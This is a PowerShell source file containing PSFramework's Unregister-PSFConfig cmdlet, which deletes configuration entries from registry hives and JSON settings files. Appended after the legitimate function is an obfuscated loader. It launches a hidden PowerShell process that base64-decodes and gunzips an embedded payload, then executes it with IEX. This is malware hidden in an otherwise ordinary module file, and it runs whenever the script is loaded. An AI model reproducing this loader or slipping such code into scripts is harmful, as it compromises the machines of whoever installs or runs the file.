function Unregister-PSFConfig
{

	[CmdletBinding(DefaultParameterSetName = 'Pipeline', HelpUri = 'https://psframework.org/documentation/commands/PSFramework/Unregister-PSFConfig')]
	param (
		[Parameter(ValueFromPipeline = $true, ParameterSetName = 'Pipeline')]
		[PSFramework.Configuration.Config[]]
		$ConfigurationItem,
		
		[Parameter(ValueFromPipeline = $true, ParameterSetName = 'Pipeline')]
		[string[]]
		$FullName,
		
		[Parameter(Mandatory = $true, ParameterSetName = 'Module')]
		[string]
		$Module,
		
		[Parameter(ParameterSetName = 'Module')]
		[string]
		$Name = "*",
		
		[PSFramework.Configuration.ConfigScope]
		$Scope = "UserDefault"
	)
	
	begin
	{
		if (($PSVersionTable.PSVersion.Major -ge 6) -and ($PSVersionTable.OS -notlike "*Windows*") -and ($Scope -band 15))
		{
			Stop-PSFFunction -Message "Cannot unregister configurations from registry on non-windows machines." -Tag 'NotSupported' -Category ResourceUnavailable
			return
		}
		
		
		$registryProperties = @()
		if ($Scope -band 1)
		{
			if (Test-Path $script:path_RegistryUserDefault) { $registryProperties += Get-ItemProperty -Path $script:path_RegistryUserDefault }
		}
		if ($Scope -band 2)
		{
			if (Test-Path $script:path_RegistryUserEnforced) { $registryProperties += Get-ItemProperty -Path $script:path_RegistryUserEnforced }
		}
		if ($Scope -band 4)
		{
			if (Test-Path $script:path_RegistryMachineDefault) { $registryProperties += Get-ItemProperty -Path $script:path_RegistryMachineDefault }
		}
		if ($Scope -band 8)
		{
			if (Test-Path $script:path_RegistryMachineEnforced) { $registryProperties += Get-ItemProperty -Path $script:path_RegistryMachineEnforced }
		}
		$pathProperties = @()
		if ($Scope -band 16)
		{
			$fileUserLocalSettings = @()
			if (Test-Path (Join-Path $script:path_FileUserLocal "psf_config.json")) { $fileUserLocalSettings = Get-Content (Join-Path $script:path_FileUserLocal "psf_config.json") -Encoding UTF8 | ConvertFrom-Json }
			if ($fileUserLocalSettings)
			{
				$pathProperties += [pscustomobject]@{
					Path	   = (Join-Path $script:path_FileUserLocal "psf_config.json")
					Properties = $fileUserLocalSettings
					Changed    = $false
				}
			}
		}
		if ($Scope -band 32)
		{
			$fileUserSharedSettings = @()
			if (Test-Path (Join-Path $script:path_FileUserShared "psf_config.json")) { $fileUserSharedSettings = Get-Content (Join-Path $script:path_FileUserShared "psf_config.json") -Encoding UTF8 | ConvertFrom-Json }
			if ($fileUserSharedSettings)
			{
				$pathProperties += [pscustomobject]@{
					Path	   = (Join-Path $script:path_FileUserShared "psf_config.json")
					Properties = $fileUserSharedSettings
					Changed    = $false
				}
			}
		}
		if ($Scope -band 64)
		{
			$fileSystemSettings = @()
			if (Test-Path (Join-Path $script:path_FileSystem "psf_config.json")) { $fileSystemSettings = Get-Content (Join-Path $script:path_FileSystem "psf_config.json") -Encoding UTF8 | ConvertFrom-Json }
			if ($fileSystemSettings)
			{
				$pathProperties += [pscustomobject]@{
					Path	   = (Join-Path $script:path_FileSystem "psf_config.json")
					Properties = $fileSystemSettings
					Changed    = $false
				}
			}
		}
		
		
		$common = 'PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider'
	}
	process
	{
		if (Test-PSFFunctionInterrupt) { return }
		
		if (-not ($pathProperties -or $registryProperties)) { return }
		
		foreach ($item in $ConfigurationItem)
		{
			
			foreach ($hive in ($registryProperties | Where-Object { $_.PSObject.Properties.Name -eq $item.FullName }))
			{
				Remove-ItemProperty -Path $hive.PSPath -Name $item.FullName
			}
			
			foreach ($fileConfig in ($pathProperties | Where-Object { $_.Properties.FullName -contains $item.FullName }))
			{
				$fileConfig.Properties = $fileConfig.Properties | Where-Object FullName -NE $item.FullName
				$fileConfig.Changed = $true
			}
		}
		
		foreach ($item in $FullName)
		{
			
			if ($item -ceq "PSFramework.Configuration.Config") { continue }
			
			
			foreach ($hive in ($registryProperties | Where-Object { $_.PSObject.Properties.Name -eq $item }))
			{
				Remove-ItemProperty -Path $hive.PSPath -Name $item
			}
			
			foreach ($fileConfig in ($pathProperties | Where-Object { $_.Properties.FullName -contains $item }))
			{
				$fileConfig.Properties = $fileConfig.Properties | Where-Object FullName -NE $item
				$fileConfig.Changed = $true
			}
		}
		
		if ($Module)
		{
			$compoundName = "{0}.{1}" -f $Module, $Name
			
			
			foreach ($hive in ($registryProperties | Where-Object { $_.PSObject.Properties.Name -like $compoundName }))
			{
				foreach ($propName in $hive.PSObject.Properties.Name)
				{
					if ($propName -in $common) { continue }
					
					if ($propName -like $compoundName)
					{
						Remove-ItemProperty -Path $hive.PSPath -Name $propName
					}
				}
			}
			
			foreach ($fileConfig in ($pathProperties | Where-Object { $_.Properties.FullName -like $compoundName }))
			{
				$fileConfig.Properties = $fileConfig.Properties | Where-Object FullName -NotLike $compoundName
				$fileConfig.Changed = $true
			}
		}
	}
	end
	{
		if (Test-PSFFunctionInterrupt) { return }
		
		foreach ($fileConfig in $pathProperties)
		{
			if (-not $fileConfig.Changed) { continue }
			
			if ($fileConfig.Properties)
			{
				$fileConfig.Properties | ConvertTo-Json | Set-Content -Path $fileConfig.Path -Encoding UTF8
			}
			else
			{
				Remove-Item $fileConfig.Path
			}
		}
	}
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAFHL6FcCA71W/2/aOhD/uZP2P0QTEolGCVDWdpUmPYfwJS2h0EAoMDS5iRMMJqaOoYW9/e/vAqFlb+3Utx9eBIrtO5/Pn/vcXYJl5EnKIwUPmMeugkvXVr6/f3fUxgLPFTWzua9addss5ZSMsGLRWbCbU+3oCDQytHsllS+KOkKLhcnnmEbji4vKUggSyd08XycSxTGZ3zFKYlVT/lb6EyLI8fXdlHhS+a5kvuXrjN9hlqqtK9ibEOUYRX4ia3IPJ97lnQWjUs1+/ZrVRsfFcb56v8QsVrPOOpZknvcZy2rKDy05sLteEDVrU0/wmAcy36fRSSnfi2IckBZYWxGbyAn346wGt4CfIHIpImV7n8TATqxmYdgW3EO+L0gM2nkrWvEZUTPRkrGc8pc6Sk+/WUaSzgnIJRF84RCxoh6J8w0c+YzckGCstsjD/tJv3aQebgKtthRaDiLygps295eM7HZmtV8dfYqiBs9PkQQIfrx/9/5dsKfBeiLPbwd9qyOdQx7A6Gi0HRNwV23zmG7VvyiFnGLDwVhysYZppiuWRBsroyQMo/EYDvO/OVbudQPFvTbozja1VbELiyOXU38Mm9IYZWb3l/TE7znxqZWIX6ecSQIaEXMd4Tn19qxSXwoACRjZXjq/V2uBd2o2FRDfJIyEWCaQ5pTRr9uqcyqf9hpLynwikAdBjMEriK/2szO7KKlZK7LJHNDazbMQjwC4TPbaKX/X+9OTOShlKwzHcU5pLyGZvJziEMyIn1NQFNNUhJaSb4fZZ3ftJZPUw7Hcmxtr/4IzPbbCo1iKpQdxBAi6zoJ4FLMEkZzSoD4x1g4N98dnX8SjghmjUQiWVhAPWElwcGTCDuHnUiZoeYdIa75gZA5K2+yuMRxCLqcZseUTDomffcXTPfF3LE+g2WNy4CfE22Fc5hSXCgm1IoF5x64/dOSgUBy6VBEkjZG6z6WRsZYJ9TO8ZCRcTYHawiIkQFITfG7gmJyWHSkAMPWDfk0rCJ6BFTHbM2a0iB5o0bLh36MnFjfP/KvLaUMX5uMkQFZs2Y222Wk0yqtLxy1Lp2rJq7Yl7ertdOqgxk1vIIcWanRpYTYobxaXdOM0kT941E83xuahYDxupqEfDMwgCM8C56b4qUab/UrHKJRw06wum33jwSiU4yp9aHRorzO7rMm7gctwL9DD2+JnTB+bYuoWub2xEKpPTrzNZeDWJ7a/HjT0z/3yDFURqkRVt2bwq4EhUFt3cejy/n1B6P2wggzPpmTY6dWMTqdmoF59em9+1kPYe4snRt8t0eHi9mYC8xq4cKUXypZPNnzQAZDqHOHwBnTCSsmbBKBjfkTGxxaPS3hmcGSATm14D34NFrU2A3m3V+LIZa1bjJrDdU3Xi4N2GTUKtF8PUWISh0YHo3hlbky96Prc739qDQLdvWVnulnpLrxA1/WHhnnlDYuP59dn580+decc9XTd/ZCwA+iRWcnhtbtptg5i/lqRt7GIJ5gBF6B67zOzxkUtLcNtTpMdqnrQlWdERIRBK4Nmt2c1Yox7SVc4LNvQmHbtYgxZ2oPhSenFkaY8KWrPTWO/dHExBJchWYDF+SaJQjnJFR5PCgUo+IXHcgFu/fZbVvhirSaWckm/eEIqtc621rUkdzJ+YXVfP/8/IEwzdwIv/40QPq/9RvomWAu5ZxB+Ef288J+A/kMs+phK0HegGDGya5O/hSQl0MGnxi5uwJAgfZKPveulPG7BN8g/6nlhxGUKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

